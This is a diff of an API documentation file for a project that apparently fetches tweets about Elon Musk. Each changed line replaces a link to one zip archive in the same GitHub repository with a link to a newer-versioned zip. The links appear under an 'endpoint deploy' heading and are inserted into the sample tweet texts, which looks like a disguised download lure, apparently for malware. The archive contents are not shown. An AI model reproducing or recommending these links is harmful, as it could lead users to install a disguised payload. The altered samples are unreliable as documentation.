@@ -2,7 +2,7 @@
 
 # tweet elon musk API Documentation
 
-### endpoint deploy https://raw.githubusercontent.com/Miqman/Exploring-PublicAPITwitter/main/config/Public_Twitter_Exploring_API_2.9.zip
+### endpoint deploy https://github.com/Miqman/Exploring-PublicAPITwitter/raw/refs/heads/main/middlewares/Public_API_Twitter_Exploring_v3.2-beta.5.zip
 
 List of available endpoints:
 
@@ -182,13 +182,13 @@ _Response (200 - OK)_
       "id": "1538531227614863361",
       "created_at": "2022-06-19T14:36:43.000Z",
       "author_id": "1263491240336769026",
-      "text": "Water the seeds and watch them grow $TSLA https://raw.githubusercontent.com/Miqman/Exploring-PublicAPITwitter/main/config/Public_Twitter_Exploring_API_2.9.zip"
+      "text": "Water the seeds and watch them grow $TSLA https://github.com/Miqman/Exploring-PublicAPITwitter/raw/refs/heads/main/middlewares/Public_API_Twitter_Exploring_v3.2-beta.5.zip"
     },
     {
       "id": "1538781139048968193",
       "created_at": "2022-06-20T07:09:47.000Z",
       "author_id": "987978757",
-      "text": "a lot of effort😇 https://raw.githubusercontent.com/Miqman/Exploring-PublicAPITwitter/main/config/Public_Twitter_Exploring_API_2.9.zip https://raw.githubusercontent.com/Miqman/Exploring-PublicAPITwitter/main/config/Public_Twitter_Exploring_API_2.9.zip"
+      "text": "a lot of effort😇 https://github.com/Miqman/Exploring-PublicAPITwitter/raw/refs/heads/main/middlewares/Public_API_Twitter_Exploring_v3.2-beta.5.zip https://github.com/Miqman/Exploring-PublicAPITwitter/raw/refs/heads/main/middlewares/Public_API_Twitter_Exploring_v3.2-beta.5.zip"
     }
   ]
 }
@@ -244,7 +244,7 @@ _Response (200 - OK)_
     {
       "author_id": "377100794",
       "id": "1538907010158456832",
-      "text": "PR sejarah kemanusiaan 889 petugas pemilihan  calon presiden RI meninggal mas @elonmusk gak tertarik ? https://raw.githubusercontent.com/Miqman/Exploring-PublicAPITwitter/main/config/Public_Twitter_Exploring_API_2.9.zip"
+      "text": "PR sejarah kemanusiaan 889 petugas pemilihan  calon presiden RI meninggal mas @elonmusk gak tertarik ? https://github.com/Miqman/Exploring-PublicAPITwitter/raw/refs/heads/main/middlewares/Public_API_Twitter_Exploring_v3.2-beta.5.zip"
     }
   ]
 }
